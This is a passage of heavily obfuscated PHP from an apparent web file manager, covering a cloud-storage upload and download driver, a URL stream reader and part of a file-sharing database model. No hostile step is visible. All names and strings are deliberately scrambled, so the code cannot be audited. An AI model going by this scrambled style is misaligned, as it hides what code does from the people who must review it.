&& $ôÏ†­øö < 3); if (!$Â—‡Ô²¡) { return !1; } $×Å¶Î“Ÿ = $Â—‡Ô²¡[$ıâèò²[1559]]; $¶„‡Ç¨Á += $·şÓ©´Ÿ; } while ($×Å¶Î“Ÿ != -1); fclose($™Ÿ¸ÔÒº); $êİ‚˜£ú = array($ıâèò²[1561], $ıâèò²[1562] . $Â—‡Ô²¡[$ıâèò²[1563]], $ıâèò²[1557]); $÷Á¬‘¤î = $this->ussRequest($¦÷ıíş, $ıâèò²[259], !1, $êİ‚˜£ú); return $÷Á¬‘¤î[$ıâèò²[1274]] ? $this->getPathOuter($¨ÇñÑ») : !1; } private function uploadPart($º«Âò, $Ò„ÏŒ¿·, &$«¬‘’şå) { $Î£İ ’¹ =& $_SERVER[ìïæ“œî]; $¨Ğ›ÊŒ‹ = array($Î£İ ’¹[1564], $Î£İ ’¹[1562] . $Ò„ÏŒ¿·[$Î£İ ’¹[1563]], $Î£İ ’¹[1565] . $Ò„ÏŒ¿·[$Î£İ ’¹[1559]], $Î£İ ’¹[146] . $Ò„ÏŒ¿·[$Î£İ ’¹[1560]]); $ì™ÂÒë® = $this->ussRequest($º«Âò, $Î£İ ’¹[259], $«¬‘’şå, $¨Ğ›ÊŒ‹); return !$ì™ÂÒë®[$Î£İ ’¹[1274]] ? $ì™ÂÒë®[$Î£İ ’¹[1274]] : $ì™ÂÒë®[$Î£İ ’¹[1264]]; } public function uploadFormData($øı–øãÙ, $ø²§¦‹ = 3600) { return $this->uploadPolicy($øı–øãÙ, $ø²§¦‹); } public function multiUploadFormData($áÀÄ·ï², $ÎË¶ÓË = 3600) { $Û¬“À‡À =& $_SERVER[ìïæ“œî]; $¦Üáò§· = (int) $GLOBALS[$Û¬“À‡À[7]][$Û¬“À‡À[79]]; return $this->uploadPolicy($áÀÄ·ï², $ÎË¶ÓË, $¦Üáò§·); } private function uploadPolicy($ ùÑ¥Ï—, $Ëå±ö¬¯ = 3600, $²ùËÇƒÖ = 0) { $¿Ö§çÕ =& $_SERVER[ìïæ“œî]; $¤§¯µ´Ø = $¿Ö§çÕ[8] . $this->bucket; $‘‚Ó³ìı = gmdate($¿Ö§çÕ[1470]); $§µÛªœ = array($¿Ö§çÕ[1566] => $this->bucket, $¿Ö§çÕ[1567] => $ ùÑ¥Ï—, $¿Ö§çÕ[1568] => time() + $Ëå±ö¬¯, $¿Ö§çÕ[1569] => $‘‚Ó³ìı); if ($²ùËÇƒÖ) { $§µÛªœ[$¿Ö§çÕ[1455]] = $²ùËÇƒÖ; } $òãĞãó© = base64_encode(json_encode($§µÛªœ)); $êûì‰éÕ = base64_encode(hash_hmac($¿Ö§çÕ[1523], "\x50\x4f\123\124\46{$¤§¯µ´Ø}\46{$‘‚Ó³ìı}\x26{$òãĞãó©}", md5("{$this->userpass}"), !0)); $£“õæØ = array($¿Ö§çÕ[293] => $òãĞãó©, $¿Ö§çÕ[1570] => "\125\120\x59\x55\116\x20{$this->username}\x3a{$êûì‰éÕ}", $¿Ö§çÕ[208] => $this->endpoint . $¤§¯µ´Ø); return $£“õæØ; } public function download($ïÎ–µ›Õ, $ø‚÷) { $¿·àöÀ = IO::getPathInner(IO::mkfile($ø‚÷)); if (!($˜²ÅÒ¯ = $this->link($ïÎ–µ›Õ))) { return !1; } $ÕÜÖØ × = 0; $°ŒÍî« = 1024 * 200; $¡«’¸§÷ = fopen($¿·àöÀ, $_SERVER[ìïæ“œî][1518]); while (!0) { $­ îÙ•‹ = $this->fileSubstr($ïÎ–µ›Õ, $ÕÜÖØ ×, $°ŒÍî«); if ($­ îÙ•‹ === !1) { return !1; } fwrite($¡«’¸§÷, $­ îÙ•‹); $ÕÜÖØ × += $°ŒÍî«; if (strlen($­ îÙ•‹) < $°ŒÍî«) { break; } } fclose($¡«’¸§÷); return $ø‚÷; } public function link($ƒÛœ¯Ã, $‹ï¼ƒıÄ = array()) { $áğİÒÜ =& $_SERVER[ìïæ“œî]; $ƒÛœ¯Ã = trim($ƒÛœ¯Ã, $áğİÒÜ[8]); if (!empty($this->token)) { $¯…î˜ï… = strtotime(date($áğİÒÜ[1571])); $üòË¼¿å = substr(md5($this->token . $áğİÒÜ[360] . $¯…î˜ï… . $áğİÒÜ[1572] . $ƒÛœ¯Ã), 12, 8) . $¯…î˜ï…; $‹ï¼ƒıÄ[] = $áğİÒÜ[1573] . $üòË¼¿å; } $ìÕ×”À’ = !empty($‹ï¼ƒıÄ) ? $áğİÒÜ[76] . implode($áğİÒÜ[360], $‹ï¼ƒıÄ) : $áğİÒÜ[12]; return $this->getHost() . $áğİÒÜ[8] . $ƒÛœ¯Ã . $ìÕ×”À’; } public function fileOut($É¥¡±ú, $œ·‹ñöÑ = false, $è¤éöËâ = false, $õìòÕ¸ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($É¥¡±ú, $œ·‹ñöÑ, $è¤éöËâ, $õìòÕ¸); } if (!$è¤éöËâ) { $è¤éöËâ = $this->pathThis($É¥¡±ú); } $–ê¸Şıê = $œ·‹ñöÑ ? array($_SERVER[ìïæ“œî][1574] . rawurlencode($è¤éöËâ)) : array(); $ÄÇ’¼ñË = $this->link($É¥¡±ú, $–ê¸Şıê); $this->fileOutLink($ÄÇ’¼ñË); } public function fileOutServer($ÍÍÁüúé, $®†ù«òŒ = false, $ÍşÁöÃÓ = false, $§µÜ€™ç = '') { parent::fileOut($ÍÍÁüúé, $®†ù«òŒ, $ÍşÁöÃÓ, $§µÜ€™ç); } public function fileOutImage($üùêŞ½, $İ«ìˆ˜ö = 250) { $¦¤¿®©“ = $this->link($üùêŞ½ . $_SERVER[ìïæ“œî][1575] . $İ«ìˆ˜ö); $this->fileOutLink($¦¤¿®©“); } public function fileOutImageServer($¹ÅÇ—Ü˜, $¬Ÿ¥–ùÉ = 250) { parent::fileOutImage($¹ÅÇ—Ü˜, $¬Ÿ¥–ùÉ); } public function hashMd5($ÇèƒàÚĞ) { $§ÜÏô— =& $_SERVER[ìïæ“œî]; $Ê¨ÛÌˆ´ = $this->_objectMeta($ÇèƒàÚĞ); return isset($Ê¨ÛÌˆ´[$§ÜÏô—[245]]) ? $Ê¨ÛÌˆ´[$§ÜÏô—[245]] : !1; } public function size($ªÃ£ƒ¤) { $åúÍ­°» = $this->objectMeta($ªÃ£ƒ¤); return $åúÍ­°» ? $åúÍ­°»[$_SERVER[ìïæ“œî][79]] : 0; } public function info($Úî÷ß) { if ($this->isFolder($Úî÷ß)) { return $this->folderInfo($Úî÷ß); } else { if ($this->isFile($Úî÷ß)) { return $this->fileInfo($Úî÷ß); } } return !1; } public function exist($í©š‘Ç ) { return $this->isFile($í©š‘Ç ) || $this->isFolder($í©š‘Ç ); } public function isFile($âßçğ) { return !$this->isFolder($âßçğ) && $this->objectMeta($âßçğ); } public function isFolder($ôÍúœâ) { return $this->cacheMethod($_SERVER[ìïæ“œî][179], $ôÍúœâ); } protected function objectMeta($„É¦Ìµà) { return $this->cacheMethod($_SERVER[ìïæ“œî][181], $„É¦Ìµà); } protected function _objectMeta($¬ŒíæÒ) { $ß¸éÁÅş =& $_SERVER[ìïæ“œî]; if ($¬ŒíæÒ == $ß¸éÁÅş[12] || $¬ŒíæÒ == $ß¸éÁÅş[8]) { return array(); } $êü¦Æ¾ = $this->ussRequest($¬ŒíæÒ, $ß¸éÁÅş[1576]); if (!$êü¦Æ¾[$ß¸éÁÅş[1274]]) { return null; } $ÇàŒ§¿­ = isset($êü¦Æ¾[$ß¸éÁÅş[1264]]) ? $êü¦Æ¾[$ß¸éÁÅş[1264]] : array(); if (!isset($ÇàŒ§¿­[$ß¸éÁÅş[1577]])) { return null; } $ºÎ¦§«¬ = array($ß¸éÁÅş[33] => isset($ÇàŒ§¿­[$ß¸éÁÅş[1577]]) ? $ÇàŒ§¿­[$ß¸éÁÅş[1577]] : null, $ß¸éÁÅş[79] => isset($ÇàŒ§¿­[$ß¸éÁÅş[1578]]) ? $ÇàŒ§¿­[$ß¸éÁÅş[1578]] : null, $ß¸éÁÅş[245] => isset($ÇàŒ§¿­[$ß¸éÁÅş[1579]]) ? $ÇàŒ§¿­[$ß¸éÁÅş[1579]] : null, $ß¸éÁÅş[1546] => isset($ÇàŒ§¿­[$ß¸éÁÅş[1580]]) ? $ÇàŒ§¿­[$ß¸éÁÅş[1580]] : null); $ºÎ¦§«¬[$ß¸éÁÅş[1547]] = isset($ÇàŒ§¿­[$ß¸éÁÅş[1581]]) ? strtotime($ÇàŒ§¿­[$ß¸éÁÅş[1581]]) : $ºÎ¦§«¬[$ß¸éÁÅş[1546]]; return $ºÎ¦§«¬; } protected function _isFolder($Ÿ¿°ËšÂ) { $¼ê¯ÇˆÍ =& $_SERVER[ìïæ“œî]; if ($Ÿ¿°ËšÂ == $¼ê¯ÇˆÍ[12] || $Ÿ¿°ËšÂ == $¼ê¯ÇˆÍ[8]) { return !0; } $Í‚ ­ú… = $this->_objectMeta($Ÿ¿°ËšÂ); return isset($Í‚ ­ú…[$¼ê¯ÇˆÍ[33]]) && $Í‚ ­ú…[$¼ê¯ÇˆÍ[33]] == $¼ê¯ÇˆÍ[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ğ’¯‹‡ = false) { } public function exist($ÕÙ¾º¢†) { $¯Íò§ÂÃ = $this->info($ÕÙ¾º¢†); return $¯Íò§ÂÃ[$_SERVER[ìïæ“œî][232]]; } public function isFile($Ë¿¬ƒûô) { $ÜÊ²…§û = $this->info($Ë¿¬ƒûô); return $ÜÊ²…§û[$_SERVER[ìïæ“œî][232]]; } public function isFolder($Ú„ú®²) { return !1; } public function size($Ö”Å¦øµ) { $Ş¶ë‡¾× = $this->info($Ö”Å¦øµ); return $Ş¶ë‡¾×[$_SERVER[ìïæ“œî][79]]; } public function info($ïš˜Ô¨) { return $this->infoParse($ïš˜Ô¨); } public function infoAuth($ ê¡òò¹) { return $this->infoParse($ ê¡òò¹); } public function infoWithChildren($Ô‰ ·Ü×) { return $this->infoParse($Ô‰ ·Ü×); } public function infoFull($›³Ö±’è) { return $this->infoParse($›³Ö±’è); } private function infoParse($¤¡Õ·Œ¿) { $‰°÷Ù³£ =& $_SERVER[ìïæ“œî]; $“´æÌ‡ = $this->header($¤¡Õ·Œ¿); if (!$“´æÌ‡ || !$“´æÌ‡[$‰°÷Ù³£[799]]) { return !1; } $¸—ø­“› = _get($“´æÌ‡, $‰°÷Ù³£[413], 0); $– íé¢ = array($‰°÷Ù³£[32] => $“´æÌ‡[$‰°÷Ù³£[32]], $‰°÷Ù³£[87] => $¤¡Õ·Œ¿, $‰°÷Ù³£[33] => $‰°÷Ù³£[230], $‰°÷Ù³£[79] => intval($¸—ø­“›), $‰°÷Ù³£[169] => get_path_ext($“´æÌ‡[$‰°÷Ù³£[32]]), $‰°÷Ù³£[1432] => $¸—ø­“› > 0 && $“´æÌ‡[$‰°÷Ù³£[1582]], $‰°÷Ù³£[1433] => !1); return $– íé¢; } private function header($ÕŒâáìš) { $¹ÙŸ ¢° =& $_SERVER[ìïæ“œî]; if (isset(self::$_cacheHeader[$ÕŒâáìš])) { return self::$_cacheHeader[$ÕŒâáìš]; } $—­ÄÙ = isset($GLOBALS[$¹ÙŸ ¢°[1583]]) ? $GLOBALS[$¹ÙŸ ¢°[1583]] : !1; $GLOBALS[$¹ÙŸ ¢°[1583]] = !0; self::$_cacheHeader[$ÕŒâáìš] = url_header($ÕŒâáìš); $GLOBALS[$¹ÙŸ ¢°[1583]] = $—­ÄÙ; return self::$_cacheHeader[$ÕŒâáìš]; } public function hashSimple($ÆÄùó¥£, $È»…’öÎ = false) { $°çªíÅ¯ =& $_SERVER[ìïæ“œî]; $Ó…öÊÓ = $this->info($ÆÄùó¥£); if (!$Ó…öÊÓ || !$Ó…öÊÓ[$°çªíÅ¯[232]]) { return !1; } $Ò¨Ñâ… = $Ó…öÊÓ[$°çªíÅ¯[79]]; $ã…ØÍ©¹ = 200; $„™Õì¦¬ = 50; if ($Ò¨Ñâ… <= $ã…ØÍ©¹ * $„™Õì¦¬) { return md5($this->fileSubstr($ÆÄùó¥£, 0, $Ò¨Ñâ…)) . $Ò¨Ñâ…; } $Ïñè“á = intval($Ò¨Ñâ… / $„™Õì¦¬); $ºğÆ× = $°çªíÅ¯[12]; $ğÂ·¡ÒÄ = timeFloat(); $Èßä»ÖÑ = 15; for ($®ÂßîÕ = 0; $®ÂßîÕ < $„™Õì¦¬; $®ÂßîÕ++) { if (timeFloat() - $ğÂ·¡ÒÄ > $Èßä»ÖÑ) { return !1; } $áû«áÄİ = $this->fileSubstr($ÆÄùó¥£, $Ïñè“á * $®ÂßîÕ, $ã…ØÍ©¹); if (!$áû«áÄİ) { return !1; } $ºğÆ× .= $áû«áÄİ; } $ºğÆ× .= $this->fileSubstr($ÆÄùó¥£, $Ò¨Ñâ… - $ã…ØÍ©¹, $ã…ØÍ©¹); return md5($ºğÆ×) . $Ò¨Ñâ…; } public function getContent($ıÏ¼†ÉÚ) { return $this->fileSubstr($ıÏ¼†ÉÚ); } public function fileSubstr($î·È›, $·ŸÅ“÷ = 0, $İÒ˜ÀÚ» = -1) { $ˆ·Ô±×† =& $_SERVER[ìïæ“œî]; $êŸâ…Ú = $this->info($î·È›); if (!$êŸâ…Ú || !$êŸâ…Ú[$ˆ·Ô±×†[232]] && $êŸâ…Ú[$ˆ·Ô±×†[79]] > 1024 * 1024 * 10) { return !1; } if ($İÒ˜ÀÚ» === -1) { $İÒ˜ÀÚ» = $êŸâ…Ú[$ˆ·Ô±×†[79]]; } if ($İÒ˜ÀÚ» == 0) { return $ˆ·Ô±×†[12]; } $´‚ÇÔ‘µ = array($ˆ·Ô±×†[1584] . $·ŸÅ“÷ . $ˆ·Ô±×†[834] . ($·ŸÅ“÷ + $İÒ˜ÀÚ» - 1)); $‰œìˆêö = url_request($î·È›, $ˆ·Ô±×†[261], !1, $´‚ÇÔ‘µ, !1, !1, 30); return $‰œìˆêö[$ˆ·Ô±×†[1264]] ? $‰œìˆêö[$ˆ·Ô±×†[1264]] : $ˆ·Ô±×†[12]; } public function download($ÛÆÓºé¶, $ù»ò¿Õã) { Downloader::start($ÛÆÓºé¶, $ù»ò¿Õã); return $ù»ò¿Õã; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($İşğ°, $—ŠÁ£Ï = '') { $this->info = $this->info($İşğ°); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ìïæ“œî][87]]; $this->pathOpen = $İşğ°; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$İşğ°])) { self::$_chunkBuffer[$İşğ°] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ñÙÚ‡’ú) { $×ÊªğúÓ = $this->fileSubstr($this->pose, $ñÙÚ‡’ú); $this->pose += strlen($×ÊªğúÓ); return $×ÊªğúÓ; } public function stream_tell() { return $this->pose; } public function stream_seek($¾Ş”ÈÁĞ, $²Ê¥¾Şç) { $¸æÇˆ–® =& $_SERVER[ìïæ“œî]; if ($²Ê¥¾Şç == SEEK_SET) { $this->pose = $¾Ş”ÈÁĞ; } else { if ($²Ê¥¾Şç == SEEK_CUR) { $this->pose += $¾Ş”ÈÁĞ; } else { if ($²Ê¥¾Şç == SEEK_END) { $this->pose = $this->info[$¸æÇˆ–®[79]] + intval($¾Ş”ÈÁĞ); } } } if ($¾Ş”ÈÁĞ < 0) { $this->pose = $this->info[$¸æÇˆ–®[79]] + $¾Ş”ÈÁĞ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ìïæ“œî][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($åôÒ¹Ñ°, $»’Üé´ƒ) { $ÆëºÜÅ— =& $_SERVER[ìïæ“œî]; $ ˜Á¦¤¿ = $this->info($åôÒ¹Ñ°); return array($ÆëºÜÅ—[1585] => 0, $ÆëºÜÅ—[1586] => 0, $ÆëºÜÅ—[16] => 32768 + 511, $ÆëºÜÅ—[1587] => 0, $ÆëºÜÅ—[1588] => 0, $ÆëºÜÅ—[1589] => 0, $ÆëºÜÅ—[1590] => 0, $ÆëºÜÅ—[79] => $ ˜Á¦¤¿[$ÆëºÜÅ—[79]], $ÆëºÜÅ—[1591] => $ ˜Á¦¤¿[$ÆëºÜÅ—[1431]], $ÆëºÜÅ—[1547] => $ ˜Á¦¤¿[$ÆëºÜÅ—[88]], $ÆëºÜÅ—[1546] => $ ˜Á¦¤¿[$ÆëºÜÅ—[231]], $ÆëºÜÅ—[1592] => 0, $ÆëºÜÅ—[1593] => 0); } static $fileInfo = array(); public function info($ˆ¾¥­¦É) { $Ñıçù¨× = $_SERVER[ìïæ“œî][1594]; if (isset(self::$fileInfo[$ˆ¾¥­¦É])) { return self::$fileInfo[$ˆ¾¥­¦É]; } if (substr($ˆ¾¥­¦É, 0, strlen($Ñıçù¨×)) != $Ñıçù¨×) { return !1; } self::$fileInfo[$ˆ¾¥­¦É] = IO::info(substr($ˆ¾¥­¦É, strlen($Ñıçù¨×))); return self::$fileInfo[$ˆ¾¥­¦É]; } public static function read($ÄúÓÖ”œ, $•Ñ¿Ù³æ, $¤íâÇñÂ) { if (!isset(self::$_fopenCache[$ÄúÓÖ”œ])) { $ı‚šòÙÍ = new StreamWrapperIO(); $ı‚šòÙÍ->stream_open($ÄúÓÖ”œ); self::$_fopenCache[$ÄúÓÖ”œ] = $ı‚šòÙÍ; } $ı‚šòÙÍ = self::$_fopenCache[$ÄúÓÖ”œ]; return $ı‚šòÙÍ->fileSubstr($•Ñ¿Ù³æ, $¤íâÇñÂ); } public static function _read($¾Üı‚‘, $ŠŞ‘„¦, $‡¬šÔû‚) { $•ûœ¿¤½ =& $_SERVER[ìïæ“œî]; $ä¸À‹Òş = fopen($¾Üı‚‘, $•ûœ¿¤½[1435]); if (!$ä¸À‹Òş) { return $•ûœ¿¤½[12]; } $š—ÖıÒ× = 8192; fseek($ä¸À‹Òş, $ŠŞ‘„¦, SEEK_SET); $„¸íÚ¸ = $•ûœ¿¤½[12]; $«¤ùçîû = 0; while ($«¤ùçîû < $‡¬šÔû‚) { $ÁÄÈºì´ = min($š—ÖıÒ×, $‡¬šÔû‚ - $«¤ùçîû); $„¸íÚ¸ .= fread($ä¸À‹Òş, $ÁÄÈºì´); $«¤ùçîû += $ÁÄÈºì´; } fclose($ä¸À‹Òş); return $„¸íÚ¸; } public function fileSubstr($±¥ë©ÍÆ, $°­ˆà÷Â) { $Ãêş·ÚÒ =& $_SERVER[ìïæ“œî]; $¥ê“½ç = $this->info[$Ãêş·ÚÒ[79]]; $‡œ„¯½å = $±¥ë©ÍÆ; $Ø¿ÇÚí‚ = $°­ˆà÷Â; if ($±¥ë©ÍÆ < 0) { $±¥ë©ÍÆ = $¥ê“½ç + $±¥ë©ÍÆ; } if ($°­ˆà÷Â === !1) { $°­ˆà÷Â = $¥ê“½ç - $±¥ë©ÍÆ; } if ($±¥ë©ÍÆ + $°­ˆà÷Â > $¥ê“½ç) { $°­ˆà÷Â = $¥ê“½ç - $±¥ë©ÍÆ; } if ($°­ˆà÷Â <= 0) { return $Ãêş·ÚÒ[12]; } if ($±¥ë©ÍÆ < 0 || $±¥ë©ÍÆ >= $¥ê“½ç || $°­ˆà÷Â <= 0 || $°­ˆà÷Â > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\x65\122\x65\141\144\x20\x65\x72\x72\x6f\x72\x21\40\163\x74\141\162\x74\75{$±¥ë©ÍÆ}\73\154\x65\x6e\147\164\x68\75{$°­ˆà÷Â}\73\x20\x73\x69\x7a\145\x3d{$¥ê“½ç}\73"); } $ı°æÏÓÇ = 64 * 1024; $âÖ÷ö·£ =& self::$_chunkBuffer[$this->path]; if (!$âÖ÷ö·£) { $âÖ÷ö·£ = array(); } $Ì£ãö = 0; $¸î¸şóğ = 0; $æíêê©Æ = $Ãêş·ÚÒ[12]; foreach ($âÖ÷ö·£ as $Ì£ãö => $æíêê©Æ) { $Ì£ãö = intval($Ì£ãö); $¸î¸şóğ = $Ì£ãö + strlen($æíêê©Æ); if ($±¥ë©ÍÆ >= $¸î¸şóğ) { continue; } if ($±¥ë©ÍÆ >= $Ì£ãö && $±¥ë©ÍÆ + $°­ˆà÷Â <= $¸î¸şóğ) { return substr($æíêê©Æ, $±¥ë©ÍÆ - $Ì£ãö, $°­ˆà÷Â); } break; } if (count($âÖ÷ö·£) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ãêş·ÚÒ[1595], $Ãêş·ÚÒ[1596] . count($âÖ÷ö·£) . "\x3b\x73\x74\x61\162\164\x3d{$±¥ë©ÍÆ}\x2c\x6c\x65\156\x67\164\x68\x3d{$°­ˆà÷Â}\x3b\x70\x6f\163\145\72{$Ì£ãö}\x7e{$¸î¸şóğ}"); throw new Exception($Ãêş·ÚÒ[1597]); } $ëâ©Š¼  = intval($±¥ë©ÍÆ / $ı°æÏÓÇ) * $ı°æÏÓÇ; $Ç»ËØŠá = ceil(($±¥ë©ÍÆ + $°­ˆà÷Â) / $ı°æÏÓÇ) * $ı°æÏÓÇ - $ëâ©Š¼ ; $Çé‰äÄø = IO::fileSubstr($this->path, $ëâ©Š¼ , $Ç»ËØŠá); $âÖ÷ö·£[$ëâ©Š¼  . $Ãêş·ÚÒ[12]] = $Çé‰äÄø; ksort($âÖ÷ö·£); $ÚŸñ¼Â¼ = substr($Çé‰äÄø, $±¥ë©ÍÆ - $ëâ©Š¼ , $°­ˆà÷Â); return $ÚŸñ¼Â¼; } private function log($¦±’«ƒ¿, $œşÃñ¬ü) { $ş¶ıú =& $_SERVER[ìïæ“œî]; $‰ˆÕ©¦Ì = timeFloat() - $this->timeStart; write_log(sprintf($ş¶ıú[1598], $¦±’«ƒ¿, $this->info[$ş¶ıú[32]], $‰ˆÕ©¦Ì, $œşÃñ¬ü), $ş¶ıú[1241]); } } goto AÔ®Š·ÛïÇ; eÑ·íæÅÀÏ: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\x54\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\x65\x72\x74\54\x75\x70\x64\x61\x74\x65", "\146\165\156\143\164\x69\x6f\156"), array("\x63\162\145\141\164\145\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\x65\162\x74", "\146\x75\x6e\143\x74\151\157\156"), array("\x6f\x70\x74\x69\157\156\x73", '', "\x69\156\x73\145\162\164\x2c\165\160\x64\141\164\145\54\x73\145\154\145\143\x74", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($åüÚåŠß) { $•‚»İ¬€ =& $_SERVER[ìïæ“œî]; $âí¸ïÃ = isset($åüÚåŠß[0]) ? $åüÚåŠß[0] : !1; return array($•‚»İ¬€[2089] => array(USER_ID, $•‚»İ¬€[2090]), $•‚»İ¬€[2030] => array($âí¸ïÃ, $•‚»İ¬€[2091])); } protected function listSimple() { $Ÿé«ßô½ = array($_SERVER[ìïæ“œî][1747] => USER_ID); $‹“‰òÒÊ = $this->field($this->fieldList)->where($Ÿé«ßô½)->select(); return $‹“‰òÒÊ ? $‹“‰òÒÊ : array(); } protected function getInfo($¢å§ô³›, $†›æéÁ… = false) { $…¡½é°Ğ =& $_SERVER[ìïæ“œî]; if ($†›æéÁ…) { return $this->_getShareInfo(array($…¡½é°Ğ[665] => $¢å§ô³›)); } $¾¤ú‰ÜÄ = $this->cacheFunctionGet($…¡½é°Ğ[2032], $¢å§ô³›); return $¾¤ú‰ÜÄ; } public function getInfoByHash($ßğ±œ‰…) { return $this->_getShareInfo(array($_SERVER[ìïæ“œî][2092] => $ßğ±œ‰…)); } public function getInfoByPath($ÈªĞ€¿È) { $øù×ñı =& $_SERVER[ìïæ“œî]; $¬İˆŸ°û = array($øù×ñı[1747] => USER_ID, $øù×ñı[193] => $ÈªĞ€¿È); return $this->_getShareInfo($¬İˆŸ°û); } public function getInfoBySourcePath($İ…À®­ª) { $†ìÖáŞ =& $_SERVER[ìïæ“œî]; $¨ºÒâ•Ã = array($†ìÖáŞ[1747] => USER_ID, $†ìÖáŞ[1234] => $İ…À®­ª); return $this->_getShareInfo($¨ºÒâ•Ã); } private function _getShareInfo($åƒ×ÛÚ¬) { $üø«öØ =& $_SERVER[ìïæ“œî]; $ØšÄ¸õÅ = $this->where($åƒ×ÛÚ¬)->find(); if (!$ØšÄ¸õÅ) { return !1; } $åƒ×ÛÚ¬ = array($üø«öØ[665] => $ØšÄ¸õÅ[$üø«öØ[665]]); $š¥×ƒ×” = $üø«öØ[2093]; $ú±×Ã‡ = Model($üø«öØ[666])->order($üø«öØ[475])->field($š¥×ƒ×”)->where($åƒ×ÛÚ¬)->select(); if ($ØšÄ¸õÅ[$üø«öØ[193]] == $üø«öØ[228]) { $ØšÄ¸õÅ[$üø«öØ[90]] = IO::info($ØšÄ¸õÅ[$üø«öØ[1234]]); } else { $ØšÄ¸õÅ[$üø«öØ[90]] = Model($üø«öØ[1394])->pathInfo($ØšÄ¸õÅ[$üø«öØ[193]]); } $ØšÄ¸õÅ[$üø«öØ[2094]] = $ú±×Ã‡; return $ØšÄ¸õÅ; } protected function getInfoAuth($Æì¦ã†Ã) { $‰»‡ûÁã =& $_SERVER[ìïæ“œî]; $Ó§˜á®ñ = $this->getInfo($Æì¦ã†Ã); if ($Ó§˜á®ñ[$‰»‡ûÁã[1747]] == USER_ID) { $Ó§˜á®ñ[$‰»‡ûÁã[487]] = $Ó§˜á®ñ[$‰»‡ûÁã[90]][$‰»‡ûÁã[487]]; } else { $Ó§˜á®ñ[$‰»‡ûÁã[487]] = Model($‰»‡ûÁã[567])->authMake($Ó§˜á®ñ[$‰»‡ûÁã[2094]]); } return $Ó§˜á®ñ; } protected function listData($Ñä±“œ­ = null, $Ï¿£Ù“× = 300) { $Š†¹€´ =& $_SERVER[ìïæ“œî]; $¡ù²á† = array(array($Š†¹€´[562] => array($Š†¹€´[1067], 0), $Š†¹€´[663] => array($Š†¹€´[1067], 0), $Š†¹€´[2095] => $Š†¹€´[2048])); if ($Ñä±“œ­ == $Š†¹€´[2096]) { $¡ù²á† = array($Š†¹€´[562] => 1); } else { if ($Ñä±“œ­ == $Š†¹€´[1219]) { $¡ù²á† = array($Š†¹€´[663] => 1); } } $¡ù²á†[$Š†¹€´[1747]] = USER_ID; $¸ı‰Ò¦ı = $this->where($¡ù²á†)->selectPage($Ï¿£Ù“×); return $¸ı‰Ò¦ı; } protected function listToMe($Œ×²‰„Ş = 300) { $€ãş ğµ =& $_SERVER[ìïæ“œî]; $¸“ûÊğ¡ = Model($€ãş ğµ[2097])->userGroupParents(USER_ID); $ƒ™¹‘²³ = array($€ãş ğµ[648] => SourceModel::TYPE_USER, $€ãş ğµ[569] => USER_ID); if ($¸“ûÊğ¡) { $ƒ™¹‘²³ = array(array($€ãş ğµ[648] => SourceModel::TYPE_USER, $€ãş ğµ[569] => USER_ID), array($€ãş ğµ[648] => SourceModel::TYPE_GROUP, $€ãş ğµ[569] => array($€ãş ğµ[7], $¸“ûÊğ¡)), $€ãş ğµ[2095] => $€ãş ğµ[2048]); } $ñÛğú—™ = Model($€ãş ğµ[666])->where($ƒ™¹‘²³)->selectPage($Œ×²‰„Ş); $òÖ¿·ãå = array_to_keyvalue_group($ñÛğú—™[$€ãş ğµ[445]], $€ãş ğµ[665]); if (!$òÖ¿·ãå) { return $ñÛğú—™; } $÷Û¡…¨ò = $€ãş ğµ[2098]; $ƒ™¹‘²³ = array($€ãş ğµ[665] => array($€ãş ğµ[492], array_keys($òÖ¿·ãå)), $€ãş ğµ[1747] => array($€ãş ğµ[1069], $€ãş ğµ[228])); $üûÎç‰” = $this->field($÷Û¡…¨ò)->where($ƒ™¹‘²³)->select(); foreach ($üûÎç‰” as $‘»¼¦ç => &$¹š´²æ¸) { $¹š´²æ¸[$€ãş ğµ[2094]] = $òÖ¿·ãå[$¹š´²æ¸[$€ãş ğµ[665]]]; } unset($¹š´²æ¸); $ƒÎøÒ´ = array($€ãş ğµ[2099] => $üûÎç‰”, $€ãş ğµ[2100] => $ñÛğú—™[$€ãş ğµ[442]]); return $ƒÎøÒ´; } protected function shareAdd($êĞ°ºèÆ, $·êÏÁ‹ã) { $ˆ¶®É«Ä =& $_SERVER[ìïæ“œî]; $ÜıêŠ©« = $this->_addShareData($êĞ°ºèÆ, $·êÏÁ‹ã); if (!empty($·êÏÁ‹ã[$ˆ¶®É«Ä[2101]])) { $this->_shareAuthSet($ÜıêŠ©«, $·êÏÁ‹ã[$ˆ¶®É«Ä[2101]]); } $this->shareEventAdd($êĞ°ºèÆ, $·êÏÁ‹ã, $ˆ¶®É«Ä[2102]); return $ÜıêŠ©«; } protected function shareAddSystem($í»ÇÇ…ñ, $Ó¶ô¨ ) { $¾ÁÎêß‚ =& $_SERVER[ìïæ“œî]; $¹ÄíØïŸ = $this->_addShareData($í»ÇÇ…ñ, $Ó¶ô¨ , $¾ÁÎêß‚[191]); $this->_shareAuthSet($¹ÄíØïŸ, $Ó¶ô¨ [$¾ÁÎêß‚[2101]]); return $¹ÄíØïŸ; } private function shareEventAdd($ØÀÕ©™¦, $ÚÃèÖßë, $Â»‘°Ê¹ = "\141\144\x64") { $¶Æ»¢œù =& $_SERVER[ìïæ“œî]; if (!$ØÀÕ©™¦ || $ØÀÕ©™¦ == $¶Æ»¢œù[228]) { return; } if ($Â»‘°Ê¹ == 